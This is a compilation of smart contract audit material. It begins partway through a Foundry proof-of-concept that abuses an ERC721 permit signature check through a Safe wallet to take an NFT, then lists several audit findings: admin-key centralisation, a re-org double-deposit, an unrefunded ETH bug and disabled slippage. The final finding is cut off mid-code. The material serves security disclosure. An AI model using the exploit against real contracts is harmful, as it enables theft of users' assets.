                    abi.encodePacked(
                        '\x19\x01',
                        permitNFT.DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                permitNFT.PERMIT_TYPEHASH(), 
                                attacker.addr, // spender
                                1, // the token Id
                                permitNFT.tokenIdNonces(1), // get the nonce for the token ID "1"
                                block.timestamp + 10000000 // deadline until which, the call to `permit()` with this signature will be allowed.
                            )
                        )
                    )
                )
            );        

            // Get the message hash for the digest.
            bytes32 msgHash = fallbackHandler.getMessageHashForSafe(attacker.safe, digest);

            // Sign the hashed message and get the signature (r, s, v).
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(attacker.privateKey, msgHash);

            // The call to `permit()` -> (address spender, uint256 tokenId, uint256 deadline, v, r, s)
            bytes memory transaction = abi.encodeWithSelector(
                ERC721Permit.permit.selector,
                attacker.addr, // The address of the attacker
                1, // The token ID to hijack
                block.timestamp + 10000000, // the deadline
                v,
                r,
                s
            );

            // Sign the transaction to be sent to gnosis
            bytes memory transactionSignature = SafeUtils.signTransaction(
                address(attacker.safe),
                attacker.privateKey,
                address(permitNFT),
                transaction
            );

            // Execute the transaction
            SafeUtils.executeTransaction(
                address(attacker.safe),
                address(permitNFT),
                transaction,
                transactionSignature
            );

            // Transfer the NFT from the attacker's safe to the attacker's address. This is the final stage of the exploit
            permitNFT.transferFrom(address(attacker.safe), address(attacker.addr), 1);

            vm.stopPrank();

            /** -------------- Final checks -------------- */

            uint256 attackersBalance = permitNFT.balanceOf(address(attacker.addr));
            uint256 attackersSafeBalance = permitNFT.balanceOf(address(attacker.safe));

            if (attackersSafeBalance == 0 && attackersBalance == 1) {
                console.log("Tokens successfully hijacked from the attacker's (borrower) safe!");
            }

        }

    }

    // Serves as a replacement for openzeppelin's `isContract` function which `ERC721Permit` relies on, simply because the currently installed openzeppelin version (5.0) for this PoC setup no longer includes the function `isContract` in the `Address` library.
    library Address {
        function isContract(address account) internal view returns (bool) {
            // This method relies on extcodesize, which returns 0 for contracts in
            // construction, since the code is only stored at the end of the
            // constructor execution.

            uint256 size;
            assembly {
                size := extcodesize(account)
            }
            return size > 0;
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/ChainId.sol
    /// @title Function for getting the current chain ID
    library ChainId {
        /// @dev Gets the current chain ID
        /// @return chainId The current chain ID
        function get() internal view returns (uint256 chainId) {
            assembly {
                chainId := chainid()
            }
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/external/IERC1271.sol
    /// @title Interface for verifying contract-based account signatures
    /// @notice Interface that verifies provided signature for the data
    /// @dev Interface defined by EIP-1271
    interface IERC1271 {
        /// @notice Returns whether the provided signature is valid for the provided data
        /// @dev MUST return the bytes4 magic value 0x1626ba7e when function passes.
        /// MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5).
        /// MUST allow external calls.
        /// @param hash Hash of the data to be signed
        /// @param signature Signature byte array associated with _data
        /// @return magicValue The bytes4 magic value 0x1626ba7e
        function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);
    }

    /// @title ERC721 with permit
    /// @notice Extension to ERC721 that includes a permit function for signature based approvals
    interface IERC721Permit is IERC721 {
        /// @notice The permit typehash used in the permit signature
        /// @return The typehash for the permit
        function PERMIT_TYPEHASH() external pure returns (bytes32);

        /// @notice The domain separator used in the permit signature
        /// @return The domain seperator used in encoding of permit signature
        function DOMAIN_SEPARATOR() external view returns (bytes32);

        /// @notice Approve of a specific token ID for spending by spender via signature
        /// @param spender The account that is being approved
        /// @param tokenId The ID of the token that is being approved for spending
        /// @param deadline The deadline timestamp by which the call must be mined for the approve to work
        /// @param v Must produce valid secp256k1 signature from the holder along with `r` and `s`
        /// @param r Must produce valid secp256k1 signature from the holder along with `v` and `s`
        /// @param s Must produce valid secp256k1 signature from the holder along with `r` and `v`
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable;
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol
    /// @title ERC721 with permit
    /// @notice Nonfungible tokens that support an approve via signature, i.e. permit
    abstract contract ERC721Permit is ERC721, IERC721Permit {
        /// @dev Gets the current nonce for a token ID and then increments it, returning the original value
        function _getAndIncrementNonce(uint256 tokenId) internal virtual returns (uint256);

        /// @dev The hash of the name used in the permit signature verification
        bytes32 private immutable nameHash;

        /// @dev The hash of the version string used in the permit signature verification
        bytes32 private immutable versionHash;

        /// @notice Computes the nameHash and versionHash
        constructor(
            string memory name_,
            string memory symbol_,
            string memory version_
        ) ERC721(name_, symbol_) {
            nameHash = keccak256(bytes(name_));
            versionHash = keccak256(bytes(version_));
        }

        /// @inheritdoc IERC721Permit
        function DOMAIN_SEPARATOR() public view override returns (bytes32) {
            return
                keccak256(
                    abi.encode(
                        // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)')
                        0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,
                        nameHash,
                        versionHash,
                        ChainId.get(),
                        address(this)
                    )
                );
        }

        /// @inheritdoc IERC721Permit
        /// @dev Value is equal to keccak256("Permit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline)");
        bytes32 public constant override PERMIT_TYPEHASH =
            0x49ecf333e5b8c95c40fdafc95c1ad136e8914a8fb55e9dc8bb01eaa83a2df9ad;

        /// @inheritdoc IERC721Permit
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable override {
            require(block.timestamp <= deadline, 'Permit expired');

            bytes32 digest =
                keccak256(
                    abi.encodePacked(
                        '\x19\x01',
                        DOMAIN_SEPARATOR(),
                        keccak256(abi.encode(PERMIT_TYPEHASH, spender, tokenId, _getAndIncrementNonce(tokenId), deadline))
                    )
                );
            address owner = ownerOf(tokenId);
            require(spender != owner, 'ERC721Permit: approval to current owner');

            if (Address.isContract(owner)) {
                require(IERC1271(owner).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e, 'Unauthorized');
            } else {
                address recoveredAddress = ecrecover(digest, v, r, s);
                require(recoveredAddress != address(0), 'Invalid signature');
                require(recoveredAddress == owner, 'Unauthorized');
            }

            _approve(spender, tokenId);
        }
    }

    contract NFTWithPermit is ERC721, ERC721Permit, Ownable {

        mapping(uint256 tokenId => uint256 nonce) public tokenIdNonces;

        constructor() ERC721Permit("MyNFT", "MNFT", "1.1") Ownable(msg.sender) {}

        function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) {

            uint256 tokenIdNonce = tokenIdNonces[tokenId];

            tokenIdNonces[tokenId] += 1;

            return tokenIdNonce;
        }

        function safeMint(address to, uint256 tokenId) public onlyOwner {
            _safeMint(to, tokenId);
        }

    }

description:
In the DCAv2 protocol, there is a privileged admin account (with the role of TIME_LOCKED_ROLE) that plays a critical role in governing and regulating the protocol-wide operations (e.g., configuring various system parameters). It also has the privilege to control or govern the flow of assets managed by this protocol. Our analysis shows that the privileged account needs to be scrutinized. In the following, we examine the privileged account and their related privileged accesses in current contracts.
```solidity
/// @inheritdoc IDCAHubConfigHandler
function setSwapFee(uint32 _swapFee) external onlyRole(TIME_LOCKED_ROLE) {
    _validateFee(_swapFee);
    swapFee = _swapFee;
    emit SwapFeeSet(_swapFee);
}

/// @inheritdoc IDCAHubConfigHandler
function setLoanFee(uint32 _loanFee) external onlyRole(TIME_LOCKED_ROLE) {
    _validateFee(_loanFee);
    loanFee = _loanFee;
    emit LoanFeeSet(_loanFee);
}

/// @inheritdoc IDCAHubConfigHandler
function setPlatformFeeRatio(uint16 _platformFeeRatio) external onlyRole(TIME_LOCKED_ROLE) {
    if (_platformFeeRatio > MAX_PLATFORM_FEE_RATIO) revert HighPlatformFeeRatio();
    platformFeeRatio = _platformFeeRatio;
    emit PlatformFeeRatioSet(_platformFeeRatio);
}
```
privileged admin account is a plain EOA account, this may be worrisome and pose counter-party risk to the protocol users. Note that a multi-sig account could greatly alleviate this concern, though it is still far from perfect. Specifically, a better approach is to eliminate the administration key concern by transferring the role to a community-governed DAO. In the meantime, a timelock-based mechanism can also be considered as mitigation. Moreover, it should be noted that if current contracts need to be deployed behind a proxy, there is a need to properly manage the proxy-admin privileges as they fall in this trust issue as well.

In the DarkNess Dollar protocol, there are two privileged accounts, i.e., owner and strategist. These accounts play a critical role in governing and regulating the system-wide operations (e.g., add/remove a pool to/from the Treasury, pause/unpause minting/redeeming from an existing pool, update the targetCollateralRatio_/targetDarkOverDarkShareRatio_ for an existing pool or update the whole protocol, and set the key parameters for the DarkNess Dollar protocol, etc.). Our analysis shows that these privileged accounts need to be scrutinized. In the following, we use the Treasury contract as an example and show the representative functions potentially affected by the privileges of the owner/strategist accounts.
```solidity
function setStrategistStatus(address _account, bool _status) external onlyOwner {
    strategist[_account] = _status;
    emit StrategistStatusUpdated(_account, _status);
}

function setTreasuryPolicy(address _treasuryPolicy) public onlyOwner {
    require(_treasuryPolicy != address(0), "zero");
    treasuryPolicy = _treasuryPolicy;
}

function setOracleDollar(address _oracleDollar) external onlyOwner {
    require(_oracleDollar != address(0), "zero");
    oracleDollar = _oracleDollar;
}

function setOracleDark(address _oracleDark) external onlyOwner {
    require(_oracleDark != address(0), "zero");
    oracleDark = _oracleDark;
}

function setOracleShare(address _oracleShare) external onlyOwner {
    require(_oracleShare != address(0), "zero");
    oracleShare = _oracleShare;
}

function setOracleCollaterals(address[] memory _oracleCollaterals) external onlyOwner {
    require(_oracleCollaterals.length == 3, "invalid oracleCollaterals length");
    delete oracleCollaterals;
    for (uint256 i = 0; i < 3; i++) {
        oracleCollaterals.push(_oracleCollaterals[i]);
    }
}

function setOracleCollateral(uint256 _index, address _oracleCollateral) external onlyOwner {
    require(_oracleCollateral != address(0), "zero");
    oracleCollaterals[_index] = _oracleCollateral;
}

function setCollateralReserve(address _collateralReserve) public onlyOwner {
    require(_collateralReserve != address(0), "zero");
    collateralReserve_ = _collateralReserve;
}

function updateProtocol() external onlyStrategist {
    if (dollarPrice() > PRICE_PRECISION) {
        ITreasuryPolicy(treasuryPolicy).setMintingFee(20);
        ITreasuryPolicy(treasuryPolicy).setRedemptionFee(80);
    } else {
        ITreasuryPolicy(treasuryPolicy).setMintingFee(40);
        ITreasuryPolicy(treasuryPolicy).setRedemptionFee(40);
    }
}

// Add new Pool
function addPool(address pool_address) public onlyOwner {
    require(pools[pool_address] == false, "poolExisted");
    pools[pool_address] = true;
    pools_array.push(pool_address);
    emit PoolAdded(pool_address);
}

// Remove a pool
function removePool(address pool_address) public onlyOwner {
    require(pools[pool_address] == true, "!pool");
    // Delete from the mapping
    delete pools[pool_address];
    // Delete from the array by setting the address to 0x0
    for (uint256 i = 0; i < pools_array.length; i++) {
        if (pools_array[i] == pool_address) {
            pools_array[i] = address(0); // This will leave a null in the array and keep the indices the same
            break;
        }
    }
    emit PoolRemoved(pool_address);
}
```

Note that if an existing pool is removed by the owner, the execution of the redeem()/collectRedemption() functions in the removed pool will revert, thus users may suffer asset losses. If the privileged owner account is a plain EOA account, this may be worrisome and pose counter-party risk to the protocol users. Note that a multi-sig account could greatly alleviate this concern, though it is still far from perfect. Specifically, a better approach is to eliminate the administration key concern by transferring the role to a community-governed DAO. In the meantime, a timelock-based mechanism can also be considered as mitigation. Moreover, it should be noted if current contracts are to be deployed behind a proxy, there is a need to properly manage the proxy-admin privileges as they fall in this trust issue as well.

Let's take a look at how transaction control is performed. When Deposit is called in Vault:  
```solidity
emit LogDeposit(_requestId, _subaccount, _tokenAddress, _amount);
```
The requestId is responsible for identifying the transaction. Then, in the depositHandler, each requestId is processed as follows:  
```solidity
function _executeAction(bytes memory _data) internal override {
    (uint256 _requestId, bytes32 _subaccount, uint256 _amount, address _tokenAddress, DepositAction _action) =
        abi.decode(_data, (uint256, bytes32, uint256, address, DepositAction));
    if (_subaccount != bytes32(0) && !isProcessed[_requestId]) {
        if (_action == DepositAction.Process) {
            IAssetService(assetService).adjustCollateral(_subaccount, _tokenAddress, _amount.toInt256());
            emit LogDepositProcessed(_subaccount, _tokenAddress, _amount);
        } else {
            emit LogDepositRejected(_subaccount, _tokenAddress, _amount);
        }
        isProcessed[_requestId] = true;
    }
}
```
That is, each requestId is simply marked as fulfilled in the dictionary. Note that there is no binding to the Vault contract. Obviously, this control will not catch the case of re-org attack. Since Deposit Handler does not check whether such a requestId has been registered in Vault. Let's consider two scenarios, normal and c re-org.  
An important condition for an incorrect count to occur is the presence of any other transaction that increments the request id in the same block as the sequencer transaction. But if we look at Vault::deposit process - there is no any permission for any user to deposit for any subaccount. So, this condition can also happen intentionally. But it is still more likely to occur by accident.  
• Normal flow:  
– Block 1:  
* (1) USER1 Deposit →generated requestId = 1.  
– Block 2:  
* (2) Off-chain Sequencer send deposit to USER1 with requestId = 1.  
* (3) DepositHandler marks requestId = 1 as completed, funds goes to USER1.  
* (4) USER2 Deposit →generate requestId = 1.  
• Re-org flow:  
– Block 1:  
* (1) Off-chain Sequencer send deposit to USER1 with requestId = 1.  
* (2) DepositHandler marks requestId = 1 as completed, funds goes to USER1.  
* (3) USER2 Deposit →generate requestId = 1 (then DepositHandler transaction for him will revert).  
– Block 2:  
* (4) USER1 Deposit →generate requestId = 2 (then he will receive his funds again, thus receiving double amount).  

Impact Explanation:  
In case of chain re-org one user will receive his deposit * 2 while one other user will fail his deposit.

In the DarkCrypto protocol, there is a special administrative account, i.e., Operator. This Operator account plays a critical role in governing and regulating the system-wide operations (e.g., setting protocol-wide parameters, etc.). It also has the privilege to control or govern the flow of assets managed by this protocol. Our analysis shows that the privileged account needs to be scrutinized. In the following, we examine the privileged account and their related privileged accesses in current contracts. To elaborate, we show below several privileged functions in the Treasury contract, which allows the Operator to configure some critical system-wide parameters or settings.
```solidity
function setBoardroom(address _boardroom) external onlyOperator {
    boardroom = _boardroom;
}

function setDarkOracle(address _darkOracle) external onlyOperator {
    darkOracle = _darkOracle;
}

function setDarkPriceCeiling(uint256 _darkPriceCeiling) external onlyOperator {
    require(_darkPriceCeiling >= darkPriceOne && _darkPriceCeiling <= darkPriceOne.mul(120).div(100), "out of range"); // [$1.0, $1.2]
    darkPriceCeiling = _darkPriceCeiling;
}

function boardroomSetOperator(address _operator) external onlyOperator {
    IBoardroom(boardroom).setOperator(_operator);
}
```
It is worrisome if the privileged admin account is a plain EOA account. Note that a multi-sig account could greatly alleviate this concern, though it is still far from perfect. Specifically, a better approach is to eliminate the administration key concern by transferring the role to a community-governed DAO.

In the Treasury contract, the getBurnableDarkLeft() viewer function allows the caller to get the _burnableDarkLeft. As shown in the following code snippets, the _burnableDarkLeft takes the minimum value between epochSupplyContractionLeft and _maxBurnableDark, where _maxBurnableDark is derived from _maxMintableBond.mul(_darkPrice).div(1e18) (line 189).
```solidity
function getBurnableDarkLeft() public view returns (uint256 _burnableDarkLeft) {
    uint256 _darkPrice = getDarkPrice();
    if (_darkPrice <= darkPriceOne) {
        uint256 _darkSupply = getDarkCirculatingSupply();
        uint256 _bondMaxSupply = _darkSupply.mul(maxDebtRatioPercent).div(10000);
        uint256 _bondSupply = IERC20(light).totalSupply();
        if (_bondMaxSupply > _bondSupply) {
            uint256 _maxMintableBond = _bondMaxSupply.sub(_bondSupply);
            uint256 _maxBurnableDark = _maxMintableBond.mul(_darkPrice).div(1e18);
            _burnableDarkLeft = Math.min(epochSupplyContractionLeft, _maxBurnableDark);
        }
    }
}
```
On the other hand, the redeemBonds() function in the same contract also calculates the amount of DARK could be redeemed. As shown in the following code snippets, the _darkAmount is derived from _bondAmount.mul(_rate).div(1e18) (line 466). The inconsistent Dark amount calculations between these two functions may introduce unexpected result.
```solidity
function redeemBonds(uint256 _bondAmount, uint256 targetPrice) external onlyOneBlock checkCondition checkOperator {
    require(_bondAmount > 0, "Treasury: cannot redeem bonds with zero amount");
    uint256 darkPrice = getDarkPrice();
    require(darkPrice == targetPrice, "Treasury: DARK price moved");
    require(
        darkPrice > darkPriceCeiling, // price > $1.01
        "Treasury: darkPrice not eligible for bond purchase"
    );
    uint256 _rate = getBondPremiumRate();
    require(_rate > 0, "Treasury: invalid bond rate");
    uint256 _darkAmount = _bondAmount.mul(_rate).div(1e18);
    require(IERC20(dark).balanceOf(address(this)) >= _darkAmount, "Treasury: treasury has no more budget");
    seigniorageSaved = seigniorageSaved.sub(Math.min(seigniorageSaved, _darkAmount));
    IBasisAsset(light).burnFrom(msg.sender, _bondAmount);
    IERC20(dark).safeTransfer(msg.sender, _darkAmount);
    _updateDarkPrice();
    emit RedeemedBonds(msg.sender, _darkAmount, _bondAmount);
}
```

In DarkCrypto, there is a contract TaxOffice which provides a number of convenience routines for liquidation addition, e.g., addLiquidityTaxFree() and addLiquidityETHTaxFree(). During the analysis of these convenience routines, we notice that addLiquidityETHTaxFree() does not refund the excess ETH properly. To elaborate, we show below the implementation of addLiquidityTaxFree(). This routine receives ETH and tokens from the caller, provides them to the uniRouter to add liquidity. The uniRouter should refund the excess ETH to the TaxOffice contract.
```solidity
function addLiquidityETHTaxFree(
    uint256 amtDark,
    uint256 amtDarkMin,
    uint256 amtFtmMin
)
    external
    payable
    returns (
        uint256,
        uint256,
        uint256
    )
{
    require(amtDark != 0 && msg.value != 0, "amounts can t be 0");
    _excludeAddressFromTax(msg.sender);
    IERC20(dark).transferFrom(msg.sender, address(this), amtDark);
    _approveTokenIfNeeded(dark, uniRouter);
    _includeAddressInTax(msg.sender);
    uint256 resultAmtDark;
    uint256 resultAmtFtm;
    uint256 liquidity;
    (resultAmtDark, resultAmtFtm, liquidity) = IUniswapV2Router(uniRouter)
        .addLiquidityETH{value: msg.value}(
            dark,
            amtDark,
            amtDarkMin,
            amtFtmMin,
            msg.sender,
            block.timestamp
        );
    if (amtDark.sub(resultAmtDark) > 0) {
        IERC20(dark).transfer(msg.sender, amtDark.sub(resultAmtDark));
    }
    return (resultAmtDark, resultAmtFtm, liquidity);
}
```
However, it comes to our attention that in the current implementation, the excess ETH returned from the router to the TaxOffice contract is not sent back to the caller. This will cause msg.value - resultAmtFtm amount of ETH left in the contract.

When swapping the tokens with function LLido.sol::swapExactInputSingleHop, the slippage control is disabled by configuring the amountOutMin to zero. This can potentially expose the swap/trade to sandwich attacks and MEV (Miner Extractable Value) attacks, resulting in a suboptimal amount of tokens received from the swap/trade.  
• In LLido.sol::swapExactInputSingleHop:  
```solidity
